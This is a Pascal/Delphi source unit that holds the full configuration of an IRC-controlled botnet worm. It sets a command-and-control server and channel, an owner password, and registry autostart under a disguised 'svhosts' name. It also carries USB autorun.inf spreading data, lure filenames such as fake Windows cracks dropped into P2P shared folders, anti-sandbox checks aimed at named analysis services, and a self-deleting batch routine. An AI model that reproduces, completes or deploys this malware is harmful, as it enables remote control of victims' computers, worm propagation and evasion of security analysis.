unit strings;

interface

var

  (* CONFIG*)
   (*    Mutex Settings                          *)
  bot_mutexname: String = 'Windows';
 
  (* login logout uninstall visit download usb icq*)
  BotComnd: array[1..11] of String = ('login', 'logout', 'uninstall', 'visit', 'download', 'usb', 'icq', 'msn', 'spread', 'seed', 'p2p');

  (* autHost, botpass*)
  AuthInfo: array[1..2] of String = ('*!*@FBI.gov', 'gaylord');


  (*    Setup-declare's, Where to install
        Filename, and Bot-Prefix                *)
  bot_installname: String = 'whosts.exe';
  prefix: String = '.';

  (*    Bot's settings for IRC-Server
        Choose wisly                            *)
  ircserver: array[1..11] of String = ('zaxmaster.opendns.be', '', '', '', '' , '' , '' ,  '' , '' , '' , ''); // or use DNS
  serverport: Integer = 9500;
  chan: String = '#dtest';
  server_channelkey: String = '';
  
  (*    Autostart settings                      *)
  
    regedit_path: String = 'Software\Microsoft\Windows\CurrentVersion\Run';
    regedit_key: String = 'svhosts';

  ////////////////////////////////////////////////
  ///  CONFIG END; DONT TOUCH THIS!
  ////////////////////////////////////////////////
  (* USB SHIT*)
  Floppy: String = 'A:\';
  USBmsg1: String = '.:USB:. Dropped to: ';
  USBmsg2: String = '  total: ';
  USBSettings: array[1..12] of String = ('10000', //Sleeptime
   '\RECYCLER', //USB_STR_RECYCLER
   '\S-1-6-21-2434476501-1644491937-600003330-1213', //USB_STR_RECYCLER_SUBDIR
    '[.ShellClassInfo]' + #13#10 + 'CLSID={645FF040-5081-101B-9F08-00AA002F954E}', //USB_STR_DESKTOP_DATA
   '\Desktop.ini',  //USB_STR_DESKTOP_INI
   '\\autorun.inf',   //USB_STR_AUTORUN_INF
   '[autorun]'+ #13#10 + 'open=', //USB_STR_AUTORUN_DATA1
   #13#10 + 'icon=%SystemRoot%\system32\SHELL32.dll,4'+ #13#10 + 'action=Open folder to view files'+ #13#10 +'shell\open=Open' + #13#10 +'shell\open\command=',  //USB_STR_AUTORUN_DATA2
   #13#10 +'shell\open\default=1',      //USB_STR_AUTORUN_DATA3
   'autorunme.exe',              //USB_STR_FILENAME
   '#spam',                       //USB_CHANNEL
   '\'
    );

  (* DL Output*)
  Dl1 : String = 'Attempting to download ';
  Dl2 : String = 'Download Complete!';
  Dl3 : String = 'File Downloaded & Executed!';
  Dl4 : String = 'Download Failed!';

  (* LOGIN*)
  LoginPut : String  = 'Welcome Master!';
  LogoutPut: String  = 'I will wait for you master!';


  (* Other Vars*)
  uTOrrentname : String = 'uTorrent.exe';
  AzureusName  : String = 'Azureus.exe';
  uTorrent     : String = '\xB5Torrent';
  azpath       : String = 'SOFTWARE\AZUREUS';
  utpath       : String = 'SOFTWARE\BitTorrent\uTorrent';
  azchar1      : String = 'Torrent(s)';
  azchar2      : String = 'Azureus';
  open         : String = 'open';
  azchar3      : String = 'Already exists';
  azchar4      : String = 'Information';
  utchar1      : String = 'Add New Torrent';




  Usr32 : String = 'user32.dll';
  ShFOlder: String = 'SHFolder.dll';


  (* API *)
  INternalGetwindowText : String = 'InternalGetWindowText';
  SHGetFolderPathA      : String = 'SHGetFolderPathA';
  SharedAccess          : String = 'SharedAccess';
  
  Codes64: String = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';

  (*P2P*)
  P2PPaths: array[1..26] of String =
  ('LimeWire\Shared',
   'eDonkey2000\incoming',
   'eDonkey2000\temp',
   'eDonkey2000 Downloads',
   'My Shared Folder',
   'Kazaa Lite K++\My Shared Folder',
   'KaZaA\My Shared Folder',
   'Emule\incoming',
   'Incoming',
   'Download',
   'My Downloads',
   'My Shared Folder',
   'KMD\My Shared Folder',
   'Morpheus\My Shared Folder',
   'BearShare\Shared',
   'Shared',
   'appleJuice\incoming',
   'Gnucleus\Downloads',
   'Grokster\My Grokster',
   'Overnet\incoming',
   'Shareaza\Downloads',
   'Swaptor\Download',
   'WinMX\My Shared Folder',
   'Tesla\Files',
   'XoloX\Downloads',
   'Rapigator\Share');


  p2pnames: array[1..9] of String = ('Windows_XP-Crack.exe', 'Windows_VISTA-Crack.exe', 'Anti-WGA-Patch.exe', 'LimeWirePro-INSTALLER.exe', 'InetSpeedup.exe', 'EA-KeyGEN_all-Products.exe', 'VistaCrack.exe', 'SteamCrack-Online_1.0.9.exe', 'CSS-Aimbot_2.9.exe');

   (* IM *)
   ICQpath : String  = 'SOFTWARE\ICQ\ICQ6';
   aimpath : String  = 'SOFTWARE\AOL\AIM\6';

   (* ANTI SANDBOX*)
   SbieDll : String  = 'SbieDll.dll';
   DbgHelp : String  = 'dbghelp.dll';
   CurVer  : String  = 'Software\Microsoft\Windows\CurrentVersion';
   Pid     : String  = 'ProductId';
   jbox    : String  = '55274-640-2673064-23950';
   cwsbox  : String  = '76487-644-3177037-23510';
   anubis  : String  = '76487-337-8429955-22614';

   (* DeleteSelf *)
   batname : String  = 'sys.bat';
   tryname : String  = ':try';
   delname : String  = 'del "';
   sign    : String  = '"';
   del1    : String  = 'if exist "';
   del2    : String  = '" goto try';

   (* IRC *)
   IRCProt: array[1..11] of String =
   ('PRIVMSG',
    '332',
    'TOPIC',
    '001',
    'JOIN',
    'KICK',
    'USER',
    'PING',
    'QUIT',
    'PONG',
    'NICK');

    key:  String = 'Zax0mA';



implementation

end.
